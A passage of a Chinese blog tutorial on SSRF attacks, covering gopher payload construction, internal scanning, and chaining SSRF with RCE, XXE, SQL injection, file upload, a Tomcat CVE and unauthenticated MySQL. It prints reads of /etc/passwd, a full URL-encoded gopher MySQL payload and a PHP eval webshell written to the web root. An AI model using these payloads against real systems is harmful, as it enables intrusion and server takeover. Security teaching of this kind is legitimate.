class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>至此，可以用上述payload去gopher协议GET传参。我们总结一下易错点：</p><ol><li>GET传参符合规范（有必要头部信息、末尾有换行“结束符”）</li><li>URL编码符合规范</li><li>带端口号</li><li>有且仅有一个填充位</li></ol><p>然后我们用gopher协议去POST传参，基本和GET提交是一样的</p><p>先抓包，然后删除无关数据，保留必要数据</p><p>POST必要保留的头部信息：</p><p>1、路径（即第一行）</p><p>2、目标IP地址（即host）</p><p>3、Content-Type</p><p>4、Content-Length（一定要和内容的长度相匹配）</p><p>5、头部结束符（最后一定要有一个换行符作为头部结束符）</p><p>6、内容（即传递的参数，当然这个实际上也可以没有，但既然用了POST，基本是用它传参）</p><p>以上头部信息是每个POST包里必有的，可以参考下面的例子。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953468.png"></p><p>依然注意URL编码，编码后具体构造就和GET一样了</p><p>大家在构造时一定要注意这几点：</p><ol><li>POST传参符合规范（符合POST规则、数据长度一致）</li><li>URL编码符合规范</li><li>带端口号</li><li>有且仅有一个填充位</li></ol><p>用gopher协议有很多细节，每一步骤都要按标准严格执行，错一点都不行，可以说是细节决定成败，大家要注意审查</p><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><p>Gopherus：<a href="https://github.com/tarunkant/Gopherus" title="https:&#x2F;&#x2F;github.com&#x2F;tarunkant&#x2F;Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>不得不提gopherus这一工具：此工具可以自动生成 Gopher payload，以利用 SSRF并获得 RCE，省了我们刚才那一堆步骤和注意要点。</p><p>该工具的攻击范围：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">MySQL (Port-<span class="hljs-number">3306</span>)<br> <br><span class="hljs-built_in">PostgreSQL</span>(Port-<span class="hljs-number">5432</span>)<br> <br>FastCGI (Port-<span class="hljs-number">9000</span>)<br> <br>Memcached (Port-<span class="hljs-number">11211</span>)<br> <br>Redis (Port-<span class="hljs-number">6379</span>)<br> <br>Zabbix (Port-<span class="hljs-number">10050</span>)<br> <br>SMTP (Port-<span class="hljs-number">25</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953071.png"></p><p>SSRFmap：<a href="https://github.com/swisskyrepo/SSRFmap" title="https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953805.png"></p><p>SSRF-Testing：<a href="https://github.com/cujanovic/SSRF-Testing?tab=readme-ov-file" title="https:&#x2F;&#x2F;github.com&#x2F;cujanovic&#x2F;SSRF-Testing?tab&#x3D;readme-ov-file">https://github.com/cujanovic/SSRF-Testing?tab=readme-ov-file</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953131.png"></p><p>ssrf-proxy：<a href="https://github.com/bcoles/ssrf_proxy" title="https:&#x2F;&#x2F;github.com&#x2F;bcoles&#x2F;ssrf_proxy">https://github.com/bcoles/ssrf_proxy</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953640.png">​</p><h2 id="SSRF利用过程"><a href="#SSRF利用过程" class="headerlink" title="SSRF利用过程"></a>SSRF利用过程</h2><h3 id="内网主机探查"><a href="#内网主机探查" class="headerlink" title="内网主机探查"></a>内网主机探查</h3><p>如果是linux服务器，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>可以读取相应的用户信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p>可以查出该主机的内网ip。</p><p>我们上面了解到，内网IP多在</p><p>A 类：10.0.0.0～10.255.255.255</p><p>B 类：172.16.0.0～172.31.255.255</p><p>C 类：192.168.0.0～192.168.255.255</p><p>三类之中，如果我们查询到该主机的内网ip，那么我们就可以确定其内网网段</p><p>比如我们查询到其IP为172.16.0.4，那么可以知道网段为172.16.0.0-172.16.0.255（当然，我们查到的IP可能不止一个，因此可能确定出多个网段）</p><p>确定出多个网段后，我们就可以用http伪协议去全部访问一遍，当然，一个个手写太过麻烦，可以结合bp抓包爆破（用sniper，具体使用可以参考CTFHub技能树Web中SSRF的端口扫描一题，虽然目的不同，但bp的使用方式相同）</p><p>为什么要这样做呢？</p><p>因为我们下一步要通过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/fib_trie<br></code></pre></td></tr></table></figure><p>去显示arp缓存表，上面会显示出我们刚刚尝试连接的IP，无论是否连接成功我们都可以确定出存活主机（主机存活的话，肯定是要应答的）。</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>确定出存活主机后，我们需要确定各个主机的开放端口</p><p>端口扫描我们可以用到ftp:&#x2F;&#x2F;、dict:&#x2F;&#x2F;和http:&#x2F;&#x2F;，但其中ftp:&#x2F;&#x2F;效率相对较低。</p><p>我们以dict:&#x2F;&#x2F;为例，确定出存活主机，那么我们就构造payload，</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//存活主机IP:端口号</span><br></code></pre></td></tr></table></figure><p>因为这次我们要爆破两个位置，一是存活主机的IP（一般情况下不止一个），二是端口号，所以我们这次选择Cluster bumb，然后导入存活主机的IP和常用端口号进行爆破即可。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>我们可以通过http:&#x2F;&#x2F;进行目录扫描获取网站子页面</p><p>还是用bp抓包爆破，只不过这次需要导入字典</p><p>字典在kali里面有，在下面目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953389.png">​</p><p>利用过程的后面步骤就是通过找到其他漏洞去完成自己的目的，这部分内容繁多，特意放在下一板块。</p><h2 id="SSRF结合其他漏洞"><a href="#SSRF结合其他漏洞" class="headerlink" title="SSRF结合其他漏洞"></a>SSRF结合其他漏洞</h2><h3 id="结合RCE"><a href="#结合RCE" class="headerlink" title="结合RCE"></a>结合RCE</h3><p>使用shell页面进行命令执行。可以使用http协议，也可以使用gopher协议，无非是get提交与post提交，前面已经讲过</p><p>注意post提交的参数需要代码审计进行查找</p><h3 id="结合XXE"><a href="#结合XXE" class="headerlink" title="结合XXE"></a>结合XXE</h3><p>确定出XXE漏洞，还是用gopher协议（实质上和常规XXE一样，只不过要注意用gopher协议post提交）</p><h3 id="结合SQL注入"><a href="#结合SQL注入" class="headerlink" title="结合SQL注入"></a>结合SQL注入</h3><p>可以用http协议，也可以用gopher协议，不过用gopher协议进行post提交时，应该代码审计确定应该提交的参数数目及其value</p><h3 id="结合文件上传"><a href="#结合文件上传" class="headerlink" title="结合文件上传"></a>结合文件上传</h3><p>抓一个文件上传的包，然后改一改就行，注意格式要符合<strong>multipart&#x2F;form-data （一种POST 数据提交的方式）</strong></p><p>名词看着挺唬人，实际上大家做文件上传都用过，注意看Content-Type一行，已经表明了是multipart&#x2F;form-data，它其实就是一种分隔方式（boundary）。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021953087.png"></p><p>那这个multipart&#x2F;form-data有什么标准呢？</p><p>首先就是传输的各个数据用boundary分隔起来（boundary可以随便写，只要和Content-Type定义的一样就行），具体怎么分隔大家自己看包就行</p><p>其次最后结束的时候也要有boundary，并且boundary后面还要加俩横线，表示整个包的结束</p><p>最后用gopher协议发送，注意URL编码</p><h3 id="结合文件包含"><a href="#结合文件包含" class="headerlink" title="结合文件包含"></a>结合文件包含</h3><p>没啥好说的，直接用伪协议去包含就完事了</p><h3 id="结合tomcat文件写入"><a href="#结合tomcat文件写入" class="headerlink" title="结合tomcat文件写入"></a>结合tomcat文件写入</h3><p>这个其实就是CVE-2017-12615，一个远程代码执行漏洞。这个漏洞的详细信息大家可以参考下面这篇文章，讲的很详细，这里就不多啰嗦：</p><p><a href="https://blog.csdn.net/Biu_Biu_Bi/article/details/130006026" title="CVE-2017-12615（远程代码执行漏洞）-CSDN博客">CVE-2017-12615（远程代码执行漏洞）-CSDN博客</a></p><p>看完上文后，我们可以知道payload包含两部分，PUT头部信息及jsp代码。</p><p>然后我们还是将整个payload进行URL编码，最后构造gopher协议：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//127.0.0.1:8080/_编码后的payload</span><br></code></pre></td></tr></table></figure><p>当然，这个漏洞实在没看明白也没啥，关键是要明白SSRF与其他漏洞结合后，需要怎么处理。其实，SSRF结合其他漏洞并没有啥特殊的步骤，payload也和原漏洞没区别，关键就是怎么用伪协议把payload打进去，注意一下URL编码和其他小细节即可。</p><h3 id="结合MySQL未授权"><a href="#结合MySQL未授权" class="headerlink" title="结合MySQL未授权"></a>结合MySQL未授权</h3><p>MySQL未授权是什么？</p><p>其实就是登录MySQL是不需要密码。</p><p>这样的话，我们就可以直接通过有SSRF的主机去查看甚至修改数据库。</p><p>那我们的payload怎么构造呢？</p><p>首先打开抓包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure><p>上面指令是监听3306端口，-w是写入文件，在根目录的mysql.pcapng里，之所以用.pcapng文件，是为了方便后续用wireshark</p><p>然后我们写入指令</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mysql -h127.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span> -uroot –ssl-mode<span class="hljs-operator">=</span>DISABLED -e “show databases<span class="hljs-comment">;”</span><br> <br>quit<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>–ssl-mode&#x3D;DISABLED是不进行密文认证，-e是执行指令，最后quit是退出</p><p>然后用wireshark打开mysql.pcapng，右键追踪流-&gt;TCP流</p><p>按下图选择</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954781.png">​</p><p>然后复制数据，去掉换行符，ASCii码转URL编码（实际上就是每两个字符增加一个%）</p><p>最后构造gopher协议即可。</p><p>但上述方法显然太过麻烦了。这里我们一般直接用工具gopherus。</p><p>因为gopherus需要python2环境，所以在kali里下载使用。</p><p>可以看下面这张图，里面有很多功能</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954412.png">​</p><p>这里我们explore一下MySQL</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> mysql<br></code></pre></td></tr></table></figure><p>MySQL用户名是root</p><p>还是查数据库</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">show databases<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954733.png">​</p><p>直接就构造出gopher协议了，改改IP就能用。不过gopherus生成的payload只有一次URL编码，需要的话我们得在bp里再来一次</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%10</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%20</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure><p>当然我们不仅能查，如果权限够的话，我们还能改。</p><p>我们先查一下写入权限</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p>如果下面这里为Null就没有写入权限</p><p> <img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954139.png">​</p><p>如果是空白就是任意位置写入，有位置就是在当下位置可以写入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954270.png">​</p><p>用gopherus构造一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954878.png">​</p><p>如果可以写入，那就继续构造gopher协议，写入一句话木马</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &#x27;var/www/html/cmd.php&#x27;;</span><br></code></pre></td></tr></table></figure><p>一句话木马的写入路径大家按情况自己定</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021954245.png">​</p><p>然后蚁剑连接即可</p><h3 id="结合redis未授权"><a href="#结合redis未授权" class="headerlink" 